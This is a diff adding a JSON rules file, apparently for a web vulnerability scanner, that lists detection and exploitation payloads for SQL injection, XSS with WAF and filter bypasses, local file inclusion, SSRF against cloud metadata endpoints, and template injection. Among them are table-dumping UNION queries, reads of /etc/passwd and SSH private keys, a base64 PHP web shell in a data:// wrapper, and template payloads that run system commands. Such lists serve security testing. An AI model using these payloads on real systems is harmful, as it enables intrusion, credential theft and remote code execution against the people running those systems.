@@ -1,0 +1,134 @@
+{
+  "sqli_advanced": {
+    "description": "Advanced SQL injection detection and exploitation rules",
+    "patterns": [
+      "' OR '1'='1'--",
+      "' UNION SELECT null,version()--",
+      "'; WAITFOR DELAY '00:00:05'--",
+      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+    ],
+    "contexts": {
+      "mysql": {
+        "detection": ["SELECT version()", "SELECT user()", "SELECT database()"],
+        "exploitation": ["UNION SELECT 1,2,3,4,5,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--"]
+      },
+      "postgresql": {
+        "detection": ["SELECT version()", "SELECT current_user", "SELECT current_database()"],
+        "exploitation": ["UNION SELECT 1,2,3,string_agg(table_name,',') FROM information_schema.tables--"]
+      },
+      "mssql": {
+        "detection": ["SELECT @@version", "SELECT user_name()", "SELECT db_name()"],
+        "exploitation": ["UNION SELECT 1,2,3,name FROM sys.tables--"]
+      }
+    }
+  },
+  "xss_advanced": {
+    "description": "Advanced XSS payload generation rules",
+    "patterns": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "javascript:alert('XSS')"
+    ],
+    "contexts": {
+      "html": {
+        "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
+        "advanced": ["<svg/onload=alert(String.fromCharCode(88,83,83))>", "<details open ontoggle=alert(1)>"]
+      },
+      "javascript": {
+        "basic": ["';alert(1);//", "\";alert(1);//"],
+        "advanced": ["';(function(){alert(1)})();//", "\";window['ale'+'rt'](1);//"]
+      },
+      "attribute": {
+        "basic": ["\" onload=alert(1) \"", "' onload=alert(1) '"],
+        "advanced": ["\" onpointerenter=alert(1) \"", "' onfocus=alert(1) autofocus '"]
+      }
+    },
+    "bypasses": {
+      "waf": [
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "<svg onload=alert(/XSS/)>",
+        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>"
+      ],
+      "filter": [
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "<script>ale\\u0072t(1)</script>",
+        "<script>window['al'+'ert'](1)</script>"
+      ]
+    }
+  },
+  "lfi_advanced": {
+    "description": "Local file inclusion exploitation patterns",
+    "patterns": [
+      "../../../etc/passwd",
+      "....//....//....//etc/passwd",
+      "..%2F..%2F..%2Fetc%2Fpasswd",
+      "php://filter/read=convert.base64-encode/resource=index.php"
+    ],
+    "contexts": {
+      "linux": {
+        "basic": ["../../../etc/passwd", "../../../etc/hosts", "../../../proc/version"],
+        "advanced": ["../../../var/log/apache2/access.log", "../../../home/user/.ssh/id_rsa"]
+      },
+      "windows": {
+        "basic": ["..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "..\\..\\..\\windows\\win.ini"],
+        "advanced": ["..\\..\\..\\Users\\Administrator\\Desktop\\desktop.ini"]
+      },
+      "php": {
+        "wrappers": [
+          "php://filter/read=convert.base64-encode/resource=index.php",
+          "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+          "expect://id"
+        ]
+      }
+    }
+  },
+  "ssrf_advanced": {
+    "description": "Server-side request forgery exploitation patterns",
+    "patterns": [
+      "http://127.0.0.1:80/",
+      "http://localhost:22/",
+      "file:///etc/passwd",
+      "gopher://127.0.0.1:3306/"
+    ],
+    "contexts": {
+      "internal": {
+        "localhost": ["http://127.0.0.1", "http://localhost", "http://0.0.0.0"],
+        "private_networks": ["http://10.0.0.1", "http://192.168.1.1", "http://172.16.0.1"]
+      },
+      "cloud": {
+        "aws": ["http://169.254.169.254/latest/meta-data/"],
+        "gcp": ["http://metadata.google.internal/computeMetadata/v1/"],
+        "azure": ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"]
+      },
+      "protocols": {
+        "file": ["file:///etc/passwd", "file:///proc/version"],
+        "ftp": ["ftp://127.0.0.1:21/"],
+        "gopher": ["gopher://127.0.0.1:3306/"]
+      }
+    }
+  },
+  "ssti_advanced": {
+    "description": "Server-side template injection patterns",
+    "patterns": [
+      "{{7*7}}",
+      "${7*7}",
+      "<%=7*7%>",
+      "{{config}}"
+    ],
+    "contexts": {
+      "jinja2": {
+        "detection": ["{{7*7}}", "{{config}}", "{{request}}"],
+        "exploitation": ["{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"]
+      },
+      "twig": {
+        "detection": ["{{7*7}}", "{{_self}}"],
+        "exploitation": ["{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"]
+      },
+      "smarty": {
+        "detection": ["{7*7}", "{$smarty.version}"],
+        "exploitation": ["{php}echo `id`;{/php}"]
+      }
+    }
+  }
+}
